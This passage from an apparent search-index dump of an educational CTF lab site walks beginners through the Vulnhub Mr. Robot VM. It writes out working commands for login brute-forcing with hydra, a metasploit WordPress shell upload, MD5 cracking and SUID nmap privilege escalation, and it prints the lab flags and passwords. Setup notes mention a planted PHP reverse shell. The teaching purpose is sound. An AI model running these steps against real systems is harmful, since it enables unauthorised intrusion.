mistakes in it\u2019s code.","title":"Approach 2: Scanning"},{"location":"#finding-the-first-key","text":"One is an ssh service on port 22, one is an http service on port 80 and one is an https service on port 443. Let\u2019s try viewing the web page in a browser. Remember the IP address. Enter in the address of the server that had the listening services in a web browser. You can open a web browser by clicking here: You\u2019ll see a page that looks like a text terminal with a mr. robot login and a chat that says \u201cHello friend...\u201d There are several commands you can enter. The page looks a lot like it\u2019s \u201cMr Robot\u201d related! We must have found the right ip address for the Mr Robot server. ( Note: Many of the web page commands won\u2019t work- we disabled some of the content for this challenge ). Now we need to start thinking about how to solve this challenge. Remember our goal- we\u2019re trying to find some clues that would help us identify a way to log into the system. Somewhere on this web page are clues that will help us figure out the next step. Play with the page and see if you can solve it. If you are stuck, move to the next section for a spoiler: Spoiler: While the page is interesting, it\u2019s mostly fun looking marketing material for the tv show Mr. Robot. Viewing the page source won\u2019t yield much in terms of clues. But hidden in the pages is some material that will help you solve the challenge. Close the browser and go back to the linux terminal. Our nmap output told us there is a web server running on port 80 and port 443. Let\u2019s use an nmap NSE script to further spider the web site for more information: nmap -n -p 80 --script http-enum 10.13.13.102 (note that 10.13.13.102 may not be the right ip address for your target! use the ip you noted earlier! Also- make sure that you\u2019re not entering this command in the browser- if you see a command not found message, you probably are in the browser. Close the browser for now! :) ) This command will walk through the web app and try to report back any interesting files it finds. It takes about two minutes to complete. You should check out the files it offers you in a web browser, by adding the content to the existing ip address. E.g.: http://10.13.13.102/readme.html (note that 10.13.13.102 may not be the right ip address for your target! use the ip you noted earlier!) Spoiler One of the files the http-enum script highlights is the robots.txt file. Most web pages on the Internet have a file called \u201crobots.txt.\u201d If you want to keep a page from being spidered by a search engine, you can use this file to tell web crawlers to ignore your page\u2019s content. This \u201cMr Robot\u201d page seems to be something that someone would likely want to keep off the search engine. It\u2019s also interesting that there\u2019s a collision between the show\u2019s name this file- so let\u2019s take a look at it. In the browser\u2019s address field, let\u2019s look at the following url: 10.13.13.102/robots.txt (note that 10.13.13.102 may not be the right ip address for your target! use the ip you noted earlier!) What\u2019s robots.txt?? robots.txt files are used to tell web search engines and web spiders some rules for crawling indexing a page. They are an important component that contributes to the ranking of a page for a particular piece of content in a search engine like google. They can also be used to tell the search engine to please ignore content on the server- if for example, you wanted to keep your web page from showing up in google. In the robots.txt file, we see 3 lines: user-agent: * fsocity.dic key-1-of-3.txt A \u201cuser-agent\u201d is software that acts on behalf of a user- such as a web browser. We see the *, which is a wildcard operator. It means that this file is intended for all software connecting to the page. The next two lines are completely non-standard for a robots.txt file. It appears to be telling you about additional files on the web server. Something called fsocity.dic and key-1-of-3.txt. If we add key-1-of-3.txt to the url after the ip address (replace robots.txt)- we end up with the following page: You found the first CTF key! Congratulations! CTFs will often have obvious indicators like this to tell you you have solved the clue. This is a major achievement! This would be a good stopping point if you need to take a break. But if you\u2019d like to continue to working on the second key, continue reading!","title":"Finding the first key"},{"location":"#finding-the-second-key","text":"If we were running a jeopardy style ctf board, you\u2019d upload the key you just found to the server. But this is just a tutorial- so we\u2019ll just focus on finding and reading the remaining keys. You still have a problem: how do we log into a shell on the mr. robot system and find the remaining keys? Inspecting the robots.txt entries Maybe the fsocity.dic entry in the robots.txt file is related. What should we do? Maybe this fsocity.dic is another file on the web server Let\u2019s browse to it and see if we find anything: We found a file! Let\u2019s open it: The file seems to be a word list. It\u2019s pretty hard to parse. But there\u2019s a clue in the extension name: \u201c.dic\u201d seems like shorthand for dictionary. There are username password dictionaries that hackers can use to compromise a system. Our original goal was to find a username password combination we could use to login to the Mr.Robot shell- maybe we can use this file to perform a dictionary attack? Reload this file in the browser. Instead of opening it, click on save and accept the default location by clicking \"ok\". (this location will be /tmp/mozilla_root0). We\u2019ll need that file later. This won\u2019t work well- if you use the wordcount command on the file, you\u2019ll find that it has over 858 thousand lines in it. We\u2019re probably not ready to use this file yet. Let\u2019s try to get some more information about our target system. Let\u2019s find out more about the web server by trying to trigger an error page and look at it\u2019s output. There probably is not a file on the webserver named asdf.txt- so let\u2019s browse to it and see what the error page says: Exploring the web server for useful information Enter 10.13.13.102/asdf.txt in the address field. ( note that 10.13.13.102 may not be the right ip address for your target! use the ip you noted earlier!) notice this error page: At the bottom, the page says \u201cProudly hosted by Wordpress.\u201d Wordpress is a popular blogging platform that has a long history of vulnerabilities. Maybe we can find some wordpress specific vulnerabilities to exploit? Let\u2019s take a note of that fact and move on. Another possibility is to try clicking on the \u201clog in\u201d link (under \u201cMETA\u201d) and trying some accounts. Exploring login errors for useful information Lets\u2019 try a username of asdf and a password of asdf and see what the error says: The error is instructive! it says \u201cError: Invalid username\u201d. Obviously, asdf is not a valid user. But what if we guessed a username that is likely to be on the system? Maybe we\u2019ll get a better answer. The Mr. Robot tv show has a main character named elliot. Maybe that is a valid account on the system? Let\u2019s try username \u201celliot\u201d and password \u201casdf\u201c This time, the error is different: When we put asdf in the username field- we were told that the username was invalid. When we put in elliot, we\u2019re told we have the wrong password. There must be a valid user named elliot! Now we just need to guess elliot\u2019s password. De-duping the password dictionary file That .dic file is obviously left there for us to use. Let\u2019s leverage the .dic file for passwords. Since it\u2019s so large- and many of the entries are duplicates- let\u2019s try de-duplicating the file: Open a new terminal, and type: cd /tmp/mozilla_root0 sort /tmp/mozilla_root0/fsocity.dic | uniq -u fsocity_deduped.dic if we use wc -l against the deduped file, we see it\u2019s only 10 unique lines! A much smaller set to work with: Now we\u2019re ready to use an automated tool to brute-force elliot\u2019s password. We\u2019re going to hope that the dictionary file includes an appropriate password. We\u2019ll use a tool called \u201chydra\u201d to brute force the password. You can watch the tool attempt to work with the ngrep command in a second terminal window: ngrep -W byline \u201cPOST\u201d port 80 Open a new terminal, and type: cd /tmp/mozilla_root0 Brute forcing the password of the user \u201cElliot\u201d Now- we\u2019re going to use a tool called \u201cHydra\u201d with the dictionary file we downloaded earlier. Hydra will use every line in the dictionary file as a password for the user account elliot. This saves us from manually trying every single line of our dictionary file. Type the following command ( note that 10.13.13.102 may not be the right ip address for your target! use the ip you noted earlier!) hydra -l \u201celliot\u201d -P fsocity_deduped.dic 10.13.13.102 http-post-form \u201c/wp-login.php:log=^USER^ pwd=^PASS^ wp-submit=Log+In:F=is incorrect\u201d (If you see an error saying File for passwords not found, make sure to run the sort command from the previous page. If the command completes and it indicates that all logins worked, it suggests you had a typo on the http-post-form target value. Please review it for typos.) In the ngrep output of the other terminal, you can see the log pwd lines that were included above. Note that for every request, the log value is the same (elliot) but the password changes- it\u2019s one of the 10 entries in the dictionary file. After a few moments, hydra will finish running. If everything worked correctly, you should have the credential: So now, if we go back into the wp login and submit the username of elliot password of ER28-0652 , we should be able to login: Success! Although it\u2019s pretty boring at this point. There\u2019s not much in the wp-admin page that\u2019s of use. We still need to get extensive access to the system. Fortunately- we\u2019ve gotten far enough along that we should be able to succeed. Remember before when we mentioned that wordpress has a long history of vulnerabilities? We\u2019re going to use our knowledge of elliot\u2019s wordpress username password to gain access to the system and find the next key. Using Wordpress Credentials to get a shell on a vulnerable wordpress instance There is an exploitation framework called metasploit which includes large numbers of methods for compromising systems. Open up a terminal and type msfconsole: msfconsole Next, we\u2019ll load a wordpress adminshell exploit: use exploit/unix/webapp/wp_admin_shell_upload you can learn more about the exploit by using the info command: exploit(unix/webapp/wp_Admin_shell_upload) info We see that if we provide valid admin credentials, we\u2019ll be able get a payload onto a server that will allow us to have a shell on the system. Let\u2019s set it up: We need to set our username, password, the IP address of the target system and we need to set a WPCHECK variable to false to address a small bug. After those 4 sets are completed, if we have the right values included, we can type \u201cexploit\u201d to start the attack: If you entered in the correct values and everything was properly online, you should see a screen like the following: Let\u2019s make it easy to parse shell command output by using a special python command to spawn a shell: ** python - c import pty; pty.spawn( /bin/sh ) ** You can now easily enter in commands. You can use \u201cwhoami\u201d to see the name of the account you\u2019re currently logged into. whoami This tells us that the account name we\u2019re running under is named \u201cdaemon\u201d What\u2019s a user account? Computers typically have many different types of accounts. Some accounts have more permissions than others- while other accounts have restrictions in place that limit their functionality. Some special accounts exist (like ftp, www, nobody, root, daemon) that are used for special purposes. The daemon account is used by the webserver we just gained shell access through- so we are now able to run commands access systems that the daemon account has access to. You can use the command pwd to see the directory you\u2019re currently in: pwd It looks like we\u2019re in a long directory tree that hosts wordpress pages. Now that you\u2019ve gained access to a unix system- it\u2019s sometimes helpful to look around in the /home/ directory to figure out what our next step should be. Let\u2019s search what\u2019s in the home directory: cd /home/ And now let\u2019s list the files in that directory: ls -alh There is a directory called \u201crobot\u201d- which sounds related to our CTF. let\u2019s look inside it: You found the second CTF key! BUT THERE\u2019S A PROBLEM... Key 2 of 3 found! Unfortunately, we cannot open it because we don\u2019t have read permissions for it. We\u2019re in the daemon user, but the key is only readable by the robot user. Try to cat it and you\u2019ll get the following error: cat key-2-of-3.txt We\u2019re the currently running commands under the account named \u201cdaemon\u201d- the key is readable only by the user robot. It looks like we need to look at this md5 file to get a password that will give us access to the robot account. Let\u2019s try viewing it\u2019s contents with the more command: The file contents are: robot : c3fcd3fd76192e4007dfb496cca67e13b We know that there\u2019s an account called robot. This file includes a line with robot, and a long string which looks similar to a hash. The filename tells us it\u2019s a raw-md5 document, so perhaps this long string is the hash of a password. What\u2019s a hash? A hash is a mathematical function that should take an input value (let\u2019s say a), and generate exactly one unique output for that input value. It\u2019s kind of like a person\u2019s fingerprint. A fingerprint is not the person, but in theory, it could only be generated by the person who has the finger that generates that fingerprint. Often times, secrets are \u201cstored\u201d using a hashing function. This reduces the risk that someone can directly steal a password if they gain access to a system. Modern computing and aging hashing algorithms have made it possible to quickly determine the password for a given hash. We will use a tool called hashcat to try and find the password that generates the md5 hash \u201cc3fcd3fd76192e4007dfb496cca67e13b\u201d Cracking a password hash for the robot user account Open a terminal on your local Kali linux instance. We\u2019re going to make a file that has this hash: Type in the following command: echo \u201cc3fcd3fd76192e4007dfb496cca67e13b\u201d password.md5 This will create a file called password.md5, which stores the hash we found. We need a wordlist that with commonly used passwords that we can use to generate corresponding md5 values. Fortunately, kali has one in the /usr/share/wordlists/ directory. We\u2019ll use the rockyou.txt wordlist to try and find the password that generates our md5 hash. It will create a file called \u201ccracked.txt\u201d which stores the hash and the corresponding password. This command could take minutes or seconds, depending on the size of the word list and the computing power of your system: hashcat --force -a 0 -m 0 password.md5 /usr/share/wordlists/rockyou.txt -o cracked.txt Now let\u2019s look at our cracked.txt file. more cracked.txt This tells us that the password that generates the hash value c3fcd3d76192e4007dfb496cca67e13b is abcdefghijklmnopqrstuvwxyz . We did it! It looks like we found the password for the robot account! You can test this hash/password value by typing the following command to get the md5 value of the password: echo -n abcdefghijlkmnopqrstuvwxyz | md5sum Elevating to the robot user Now we just need to try and switch to the robot account. From our metasploit shell, let\u2019s type the following command: su robot You\u2019ll be prompted for a password. Type in abcdefghijlkmnopqrstuvwxyz If you typed it in correctly, you should see the following: Now you can view the contents of the key2-of-3.txt file: You finally can view the second CTF key! Our second key is 822c73956184f694993bede3eb39f95! Congratulations! Well done! If we were competing in a CTF, we\u2019d be uploading this value to the CTF page under our account. If you\u2019d like to take a break, this would be an excellent place to stop.","title":"Finding the second key"},{"location":"#finding-the-third-key","text":"2 keys down- 1 to go. We need to find the 3rd key. It\u2019s probably named something like key-3-of-3.txt. Maybe we can use the find command to discover it\u2019s location? find / -name key-3-of-3.txt This isn\u2019t very productive. We have lots of permission denied errors: This is happening because the Robot user is not allowed to access the entire file system. We need to elevate our privileges to be able to see what is in various directories. We should try to get access to the root account so that we can search everywhere on the file system. Searching for SUID files that might be exploitable. One way to get root is to find a vulnerable binary on your file system that has the SUID bit set for a program that is owned by root. This next step requires a bit of background knowledge- but let\u2019s start out by searching for all files on the system with the setuid bit set: find / -perm -4000 2 /dev/null A bunch of interesting files come up - but one in particular catches my eye: the nmap comand has the setuid bit set. You may not know this- but there used to be a version of nmap that had an interactive terminal. If the nmap binary has the setuid bit set, and it\u2019s owned by root, we can use it to get root. Let\u2019s find out who owns it: It\u2019s owned by the root user! Let\u2019s call nmap using the interactive shell: /usr/local/bin/nmap --interactive Exploiting an old vulnerability in NMAP to escalate to root If we put a ! before a command, we\u2019ll be able to pass shell commands through nmap running under it\u2019s setuid command. Above, you can see the \u201cwhoami\u201d comand doesn\u2019t work if you skip the !, but it does work if you add it. Not only that, but despite the fact that you invoked the nmap binary under the robot account, you\u2019re now showing up as root. Let\u2019s use this trick to look inside the /root/ directory: We found key-3-of-3.txt! Let\u2019s use nmap and the cat command to read it\u2019s contents: ! cat /root/key-3-of-3.txt You found the final CTF key! We did it! we now have the 3rd key: 04787ddef27c3dee1ee161b21670b4e4. If we had a CTF board running, this is the key value we\u2019d upload. There you go! You have finished the lab. Let\u2019s review what we learned: We learned about scanning a network to discover systems their ip addresses using nmap We found a server, and then learned how to discover network services running on the system, also using nmap. We learned how to spider a web page and discovered a robots.txt file on web servers (which also happened to be our first key!) We discovered an admin login page , and used the error messages that the login page provided and discovered valid user accounts (\u201celliot\u201d) on the system. We used a tool called Hydra and discovered elliot\u2019s password . We used metasploit and discovered vulnerabilities in the wordpress web server. We used metasploit and gained interactive shell access to the server . We used that interactive shell access to find the second key- but we couldn\u2019t access it due to a permissions setting. We cracked the password of the robot account using hashcat. We used our dicovered robot account password to view the second key. We found a setuid mistake that allowed us to use an nmap binary and escalated to the root account. We used our root privileges to find and read the 3rd key. There were multiple security mistakes that we exploited. 1. A password dictionary file was stored on the web server. Putting unnecessary files on a public web server is dangerous and should be avoided. 2. Wordpress disclosed too much information about a failed login. Error messages should not disclose information that would be useful for a hacker regarding what is happening in the web application. 3. The Wordpress version is out of date and has a known vulnerability that can be exploited to gain a shell on the service. Software should be patched and up to date to avoid exploitable security vulnerabilities. 4. The password hash used by the robot user was not salted and consequently, vulnerable to a dictionary attack. Passwords should be salted with instance specific secrets to reduce the effectiveness of a dictionary attack. 5. An out of date version of nmap had the SUID bit set for root, which enabled privilege escalation from the robot user. Software should be patched and up to date. The use of SUID for root should be generally avoided. More info on this particular mistake is available here: https://pentestlab.blog/2017/09/25/suid-executables/","title":"Finding the third key"},{"location":"#appendix","text":"What are CTFs? Computer Security experts practice their skills in competitions called \u201cCapture The Flag.\u201d During the course of r00tz asylum, the neverlanCTF folks are running a CTF competition. If you\u2019ve never competed in a CTF, it might seem intimidating- but don\u2019t worry. You absolutely have the skills to to try a CTF. It\u2019ll be intimidating as you start- but Everyone has to start somewhere. We\u2019re here to help. We\u2019re running a CTF 101 that will give you real world computer security experience. This guide will provide you with an overview of how a CTF works, and how to run through 3 real world CTF examples that are themed to align with some of the hacking events you might have seen in the TV Show \"Mr. Robot\u201d If you are nervous about competing in the CTF- our worklab will give you the confidence to succeed. Our examples are a little more challenging than those used in the CTF- but we give you nice guides to help you get unstuck. If you are interested in general computer security topics- our worklab will give you a real world example of finding extracting secrets from working linux workstations. Background: What is Capture the Flag? Capture the Flag a fun game where two teams each hide a colored flag that represents their team. The goal is to locate take the opposing team\u2019s flag and bring it back to their base. A typical CTF game might take 30-60 minutes and involve a lot of running around, hiding and playing \u201ctag\u201d to put opposing team members into jail. You get sweaty, you might get dirty. You may even get the flag and return it to your base. This is very different than a Security CTF. What is a Security CTF? In Security CTFs, we don\u2019t run around and steal flages. We generally don\u2019t get sweaty outrunning our opposition. We chase after greater adventure: We solve puzzles. Our puzzles are about searching for secret keys in operating systems or in files. Security CTFs come in two general types: Jeopardy Attack-defense. Here at r00tz, neverlan is running a Jeopardy style CTF. You\u2019ll be presented with multiple challenges worth varying amounts of points. Typically, you will be a part of a team (although you can work alone if you prefer) and all of your teammate's points will count to the final team score. The goal is for your team to have the most points at the end of the game. You get points by finding \u201cKeys\u201d and submitting them to the scoring app for the competition. A key will look similar to. (but never exactly the same) as the following: Challenges are typically presented in the style of a Jeopardy Scoreboard- where there might be 6 columns, with each column representing a specific category of security challenges. In a given row, the value of the challenge will increase based on the complexity/difficulty of the challenge. You can decide which topic you think you might know the most about and then select an individual challenge. The lower value challenges are likely to be easier, and the higher value challenges are likely to be harder. The surprising thing about CTFs is that you probably know more than you realize. Sometimes the higher value challenges turn out to be easy because you just happen to know the right details. The important things to remember are: Use a search engine to research the details of a challenge (e.g. google, bing, duckduckgo, etc.) If you don\u2019t know something, you may find answers on the Internet. Try new challenges! Don\u2019t be afraid to walk away from one that you don\u2019t understand. There\u2019s always a couple of challenges that you\u2019ll be able to solve. Take breaks! Don\u2019t be afraid to take a break from challenges if you\u2019re struggling. Sometimes you just need to step away from the problem- and suddenly the answers will become clear. Talk to your teammates. Sometimes, describing the problem you\u2019re having will help you identify a key detail you overlooked. Sometimes, you\u2019ll have a special insight that will help your teammate solve a problem. Security CTF Workflow Register your team. You will normally be given a url for a web page where you can submit your challenge answers under your team\u2019s account. Select a challenge. Review the puzzle. Collect the appropriate assets to work on the challenge (log into a vm, download a file, etc.) Identify what the target of the challenge is (the puzzle should give you some description of what your objective is. Typically, you\u2019re asked to retrieve a \u201ckey\u201d from a file/server/etc.) Post your key to the CTF web page under your team\u2019s account. If you submit the wrong key, the CTF web page will normally tell you that it\u2019s the wrong value and won\u2019t award points. If you submit the right key, you\u2019ll get the points for your team. Keep solving challenges till the competition is over. Sometimes competitions give you a bonus for being the first team to solve a challenge- but don\u2019t worry if someone else solves it before you. You still can get points. CTF strategies: First- decide if you want to work alone, or form a team. Tip : You should form/join a team! You\u2019ll learn things from other players. You\u2019ll likely teach other players things they didn\u2019t know. You\u2019ll find that a team will collect points faster than you can as a sole contributor. Don\u2019t be afraid to ask existing teams if they need someone to join them. Solve challenges based on categories you\u2019re comfortable with You can choose whatever problem you would like to work on out of all of the challenges based on the value of the challenge. You can also choose to work on a problem based on the category of the problem- you might be really comfortable looking at files, or capturing network packets- and so you may choose to work on problems based on their category. Solve challenges based on score values Are you feeling extra confident? Go for the higher score challenges. Are you feeling lucky? Go for the higher score challenges? Are you feeling nervous? Go for the lower score challenges. Don\u2019t be afraid to try categories you don\u2019t think you know. You might be surprised to discover you know more than you expect. List of Linux commands we used: ls (used to list information about files and directories within the file system.) cd (used to change the current directory) pwd ( pwd prints the name of the present/current working directory (PWD - Present Working Directory) find (utility for walking a file hierarchy. It can be used to find files and directories and perform subsequent operations on them) ip (used to assign an address to a network interface and/or configure network interface parameters on Linux operating systems. ) nmap (tool used for scanning network hosts for discovering what services the hosts are running) cat (command used to create single or multiple files, view contain of file , concatenate files and redirect output in terminal or files) more (similar to cat . more is used to view the text files in the command prompt, displaying one screen at a time in case the file is large) whoami (used to discover the user account the shell is currently running under). echo (used to display line of text/string that are passed as an argument . This is a built in command that is mostly used in shell scripts and batch files to output status text to the screen or a file.) hashcat (used to crack passwords from various hashing formats) sort (Used to sort text files)","title":"Appendix"},{"location":"contribute/","text":"Contributing Guidelines Thank you for your interest in contributing to our project. Whether it's a bug report, new feature, correction, or additional documentation, we greatly value feedback and contributions from our community. Please read through this document before submitting any issues or pull requests to ensure we have all the necessary information to effectively respond to your bug report or contribution. Reporting Bugs/Feature Requests We welcome you to use the GitHub issue tracker to report bugs or suggest features. When filing an issue, please check existing open , or recently closed , issues to make sure somebody else hasn't already reported the issue. Please try to include as much information as you can. Details like these are incredibly useful: A reproducible test case or series of steps The version of our code being used Any modifications you've made relevant to the bug Anything unusual about your environment or deployment Contributing via Pull Requests Contributions via pull requests are much appreciated. Before sending us a pull request, please ensure that: You are working against the latest source on the master branch. You check existing open, and recently merged, pull requests to make sure someone else hasn't addressed the problem already. You open an issue to discuss any significant work - we would hate for your time to be wasted. To send us a pull request, please: Fork the repository. Modify the source; please focus on the specific change you are contributing. If you also reformat all the code, it will be hard for us to focus on your change. Ensure local tests pass. Commit to your fork using clear commit messages. Send us a pull request, answering any default questions in the pull request interface. Pay attention to any automated CI failures reported in the pull request, and stay involved in the conversation. GitHub provides additional document on forking a repository and creating a pull request . Finding contributions to work on Looking at the existing issues is a great way to find something to contribute on. As our projects, by default, use the default GitHub issue labels ((enhancement/bug/duplicate/help wanted/invalid/question/wontfix), looking at any 'help wanted' issues is a great place to start. Code of Conduct This project has adopted the Amazon Open Source Code of Conduct . For more information see the Code of Conduct FAQ or contact opensource-codeofconduct@amazon.com with any additional questions or comments. Security issue notifications If you discover a potential security issue in this project we ask that you notify AWS/Amazon Security via our vulnerability reporting page . Please do not create a public github issue. Licensing See the LICENSE file for our project's licensing. We will ask you to confirm the licensing of your contribution. We may ask you to sign a Contributor License Agreement (CLA) for larger changes.","title":"Contributing"},{"location":"contribute/#contributing-guidelines","text":"Thank you for your interest in contributing to our project. Whether it's a bug report, new feature, correction, or additional documentation, we greatly value feedback and contributions from our community. Please read through this document before submitting any issues or pull requests to ensure we have all the necessary information to effectively respond to your bug report or contribution.","title":"Contributing Guidelines"},{"location":"contribute/#reporting-bugsfeature-requests","text":"We welcome you to use the GitHub issue tracker to report bugs or suggest features. When filing an issue, please check existing open , or recently closed , issues to make sure somebody else hasn't already reported the issue. Please try to include as much information as you can. Details like these are incredibly useful: A reproducible test case or series of steps The version of our code being used Any modifications you've made relevant to the bug Anything unusual about your environment or deployment","title":"Reporting Bugs/Feature Requests"},{"location":"contribute/#contributing-via-pull-requests","text":"Contributions via pull requests are much appreciated. Before sending us a pull request, please ensure that: You are working against the latest source on the master branch. You check existing open, and recently merged, pull requests to make sure someone else hasn't addressed the problem already. You open an issue to discuss any significant work - we would hate for your time to be wasted. To send us a pull request, please: Fork the repository. Modify the source; please focus on the specific change you are contributing. If you also reformat all the code, it will be hard for us to focus on your change. Ensure local tests pass. Commit to your fork using clear commit messages. Send us a pull request, answering any default questions in the pull request interface. Pay attention to any automated CI failures reported in the pull request, and stay involved in the conversation. GitHub provides additional document on forking a repository and creating a pull request .","title":"Contributing via Pull Requests"},{"location":"contribute/#finding-contributions-to-work-on","text":"Looking at the existing issues is a great way to find something to contribute on. As our projects, by default, use the default GitHub issue labels ((enhancement/bug/duplicate/help wanted/invalid/question/wontfix), looking at any 'help wanted' issues is a great place to start.","title":"Finding contributions to work on"},{"location":"contribute/#code-of-conduct","text":"This project has adopted the Amazon Open Source Code of Conduct . For more information see the Code of Conduct FAQ or contact opensource-codeofconduct@amazon.com with any additional questions or comments.","title":"Code of Conduct"},{"location":"contribute/#security-issue-notifications","text":"If you discover a potential security issue in this project we ask that you notify AWS/Amazon Security via our vulnerability reporting page . Please do not create a public github issue.","title":"Security issue notifications"},{"location":"contribute/#licensing","text":"See the LICENSE file for our project's licensing. We will ask you to confirm the licensing of your contribution. We may ask you to sign a Contributor License Agreement (CLA) for larger changes.","title":"Licensing"},{"location":"environment-setup/","text":"Environment Setup Download and install VirtualBox: https://www.virtualbox.org/ You should be safe using the default settings when installing Note you may get a popup about downloading an updated ExtensionPack, feel free to do so Open a command prompt and cd into the VirtualBox Program Files directory, something like: cd \"C:\\Program Files\\Oracle\\VirtualBox\" Configure a dhcpserver for the internal network intnet via: VBoxManage dhcpserver add -netname intnet -ip 10.13.13.100 -netmask 255.255.255.0 -lowerip 10.13.13.101 -upperip 10.13.13.254 -enable Configuring DHCP VBoxManage dhcpserver add -netname intnet -ip 10.13.13.100 -netmask 255.255.255.0 -lowerip 10.13.13.101 -upperip 10.13.13.103 -enable Download the Kali Linux VirtualBox image: https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/ . Download the Mr. Robot image: https://www.vulnhub.com/entry/mr-robot-1,151/ . Import the MrRobot Image into VirtualBox via the import button, you shouldn\u2019t need to change any of the preconfigured settings Use the VM's Settings dialog in the Oracle VM VirtualBox graphical user interface. In the Networking category of the settings dialog, select Internal Networking from the drop-down list of networking modes. Select the name of an existing internal network from the drop-down list below or enter a new name into the Name field. Ensure the machine starts correctly. RIGHT CNTRL IS THE DEFAULT BUTTON TO BREAK THE CURSOR OUT OF THE VM CONTEXT. On the machine login with the following credentials: Username: robot Password: abcdef *ghijklmnopqrstuvwxyz * (all letters of the alphabet) Navigate to: */opt/bitnami/apps/wordpress/htdocs/video * Delete everything in this file except fsociety.webm. (*this command will content from the web application that may be somewhat controversial. Since our focus is on educating students about general CTF challenge solving pentesting concepts, we\u2019re removing extraneous material.) * Once the machine is running, click Machine | Take Snapshot to take a snapshot of the Mr. Robot VM at its initial state Repeat the process for the Kali Linux OVA making sure to use the same network that was set for Mr. Robot VM Turn off the machine and configure it to use the same internal network that the Mr. Robot VM is on Start the machine and take a snapshot just as with the Mr. Robot VM From the Mr. Robot VM get it\u2019s IP address From the Kali Linux machine, navigate to the IP address in the web browser and confirm the site loads. Resetting the Lab Environment Between Students This should be as easy as reloading back to the snapshots taken during the setup to ensure a fresh, clean environment for the next student Guide for Students Start off with the basics of Linux commands: cd, clear, ls, cat, vim, grep, man, su etc. Talk about user directories Talk about root vs a regular user Go into detail about nmap, how to use it to scan for live hosts on a network and how to scan a specific host Briefly touch on common ports used by a server: HTTP, SSH, etc. Go into detail about the Robots Exclusion Standard, aka robots.txt Talk about WordPress Specifically talk about things like wp-admin, wp-login, readme.html and license.txt Discuss how WordPress is commonly associated with a large number of vulnerabilities due to ease of misconfiguration Go into detail about capturing and viewing network calls via the developer tools of a browser and Burp Suite Go into detail about how dictionary attacks work and talk about how to use THCHydra, the password cracker Go into detail about local file inclusion attacks, and remote code executions Note that as per environment setup, there should be a pre-saves PHP file that will open a reverse shell on the host Go into detail about netcat and how it works Talk about hashes and how MD5 is considered broken Talk about the SUID bit and why it\u2019s dangerous","title":"Environment Setup"},{"location":"environment-setup/#environment-setup","text":"Download and install VirtualBox: https://www.virtualbox.org/ You should be safe using the default settings when installing Note you may get a popup about downloading an updated ExtensionPack, feel free to do so Open a command prompt and cd into the VirtualBox Program Files directory, something like: cd \"C:\\Program Files\\Oracle\\VirtualBox\" Configure a dhcpserver for the internal network intnet via: VBoxManage dhcpserver add -netname intnet -ip 10.13.13.100 -netmask 255.255.255.0 -lowerip 10.13.13.101 -upperip 10.13.13.254 -enable","title":"Environment Setup"},{"location":"environment-setup/#configuring-dhcp","text":"VBoxManage dhcpserver add -netname intnet -ip 10.13.13.100 -netmask 255.255.255.0 -lowerip 10.13.13.101 -upperip 10.13.13.103 -enable Download the Kali Linux VirtualBox image: https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/ . Download the Mr. Robot image: https://www.vulnhub.com/entry/mr-robot-1,151/ . Import the MrRobot Image into VirtualBox via the import button, you shouldn\u2019t need to change any of the preconfigured settings Use the VM's Settings dialog in the Oracle VM VirtualBox graphical user interface. In the Networking category of the settings dialog, select Internal Networking from the drop-down list of networking modes. Select the name of an existing internal network from the drop-down list below or enter a new name into the Name field. Ensure the machine starts correctly. RIGHT CNTRL IS THE DEFAULT BUTTON TO BREAK THE CURSOR OUT OF THE VM CONTEXT. On the machine login with the following credentials: Username: robot Password: abcdef *ghijklmnopqrstuvwxyz * (all letters of the alphabet) Navigate to: */opt/bitnami/apps/wordpress/htdocs/video * Delete everything in this file except fsociety.webm. (*this command will content from the web application that may be somewhat controversial. Since our focus is on educating students about general CTF challenge solving pentesting concepts, we\u2019re removing extraneous material.) * Once the machine is running, click Machine | Take Snapshot to take a snapshot of the Mr. Robot VM at its initial state Repeat the process for the Kali Linux OVA making sure to use the same network that was set for Mr. Robot VM Turn off the machine and configure it to use the same internal network that the Mr. Robot VM is on Start the machine and take a snapshot just as with the Mr. Robot VM From the Mr. Robot VM get it\u2019s IP address From the Kali Linux machine, navigate to the IP address in the web browser and confirm the site loads.","title":"Configuring DHCP"},{"location":"environment-setup/#resetting-the-lab-environment-between-students","text":"This should be as easy as reloading back to the snapshots taken during the setup to ensure a fresh, clean environment for the next student","title":"Resetting the Lab Environment Between Students"},{"location":"environment-setup/#guide-for-students","text":"Start off with the basics of Linux commands: cd, clear, ls, cat, vim, grep, man, su etc. Talk about user directories Talk about root vs a regular user Go into detail about nmap, how to use it to scan for live hosts on a network and how to scan a specific host Briefly touch on common ports used by a server: HTTP, SSH, etc. Go into detail about the Robots Exclusion Standard, aka robots.txt Talk about WordPress Specifically talk about things like wp-admin, wp-login, readme.html and license.txt Discuss how WordPress is commonly associated with a large number of vulnerabilities due to ease of misconfiguration Go into detail about capturing and viewing network calls via the developer tools of a browser and Burp Suite Go into detail about how dictionary attacks work and talk about how to use THCHydra, the password cracker Go into detail about local file inclusion attacks, and remote code executions Note that as per environment setup, there should be a pre-saves PHP file that will open a reverse shell on the host Go into detail about netcat and how it works Talk about hashes and how MD5 is considered broken Talk about the SUID bit and why it\u2019s dangerous","title":"Guide for Students"},{"location":"license/","text":"License MIT License Copyright 2018 Amazon.com, Inc. or its affiliates. All Rights Reserved. Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so. THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.","title":"License"},{"location":"license/#license","text":"MIT License Copyright 2018 Amazon.com, Inc. or its affiliates. All Rights Reserved. Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so. THE SOFTWARE 